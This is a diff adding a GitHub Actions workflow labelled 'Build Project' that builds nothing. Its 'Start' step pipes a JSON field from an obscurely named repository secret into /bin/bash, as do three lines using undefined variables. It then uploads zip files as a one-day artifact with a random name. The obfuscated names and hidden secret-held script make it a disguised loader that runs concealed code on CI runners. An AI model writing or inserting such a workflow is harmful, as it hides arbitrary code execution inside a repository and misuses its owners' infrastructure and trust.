@@ -1,0 +1,29 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  trigger:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Start
+        env:
+          unwvz47: ${{ secrets.unwvz47 }}
+        run: |
+          printf '%s' "$unwvz47" | jq -r .hr4876 | /bin/bash
+          echo $lervb41 | jq -r .bxsyu462 | /bin/bash
+          printf '%s' "$gsr128" | jq -r .qk1 | /bin/bash
+          printf '%s' "$kl2888" | jq -r .igcr630 | /bin/bash
+
+      - name: Save output
+        uses: actions/upload-artifact@v4
+        with:
+          name: lhbLVWO3
+          path: "*.zip"
+          retention-days: 1
